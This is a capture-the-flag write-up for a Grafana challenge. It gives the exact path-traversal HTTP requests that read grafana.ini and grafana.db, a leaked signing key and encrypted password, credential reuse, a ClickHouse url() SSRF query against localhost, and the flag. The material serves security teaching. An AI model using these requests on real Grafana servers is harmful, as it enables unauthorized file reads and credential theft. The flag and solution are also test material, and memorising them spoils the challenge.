# Grapache_Revenge

### Challenge Details

harder version of Grapache, with additional data source(clickhouse), which has another web server running and listening at localhost. Player need  to decrypt the data source in `/var/lib/grafana/grafana.db`, reuse that password to login into grafana, and abuse the [built-in SSRF feature](https://clickhouse.com/docs/en/sql-reference/table-functions/url/) of clickhouse to get the flag

### Key Concepts

SSRF, Path traversal, credential reuse

### Solution

1. read the grafana.ini to get the data source signing key.

   ```
   GET /?unix:|http:///public/plugins/welcome/../../../../../../../../etc/grafana/grafana.ini HTTP/1.1
   ```

   ```
   # used for signing
   secret_key = SW2YcwTIb9zpOOhoPsMoiID9fd
   ```

2. read the grafana database.

   ```
   GET /?unix:|http:///public/plugins/welcome/../../../../../../../../var/lib/grafana/grafana.db HTTP/1.1
   ```

   and get the data source

   ```
   $ sqlite3 grafana.db
   SQLite version 3.31.1 2020-01-27 19:55:54
   Enter ".help" for usage hints.
   sqlite> select * from data_source;
   1|1|2|grafana-clickhouse-datasource|ClickHouse|proxy|||||0|||1|{"defaultDatabase":"grey_database","port":9000,"server":"clickhouse","username":"grey_user"}|2022-05-12 08:04:32|2022-05-12 08:04:53|0|{"password":"MGtTUnVYdWPh7OhysNLOY4MgwfIKtK9P4EDX7pk9cBmWZ/5vJ2ja2MoEi7CMtA=="}|0|3eXgt3lnk
   ```

3. use [AESDecrypt.go](./AESDecrypt.go) to decrypt the data source of clickhouse.

4. reuse the credentials of clickhouse to login to grafana

5. query the data from clickhouse with the query `SELECT column1 FROM url('http://localhost',LineAsString,'column1 String')` and get the flag

### Learning Objectives

same as Key Concepts

### Flag

```
grey{wh47_4_l0n6_w4y_1_h4v3_60n3_7hr0u6h_0557d6c45546ef3a}
```
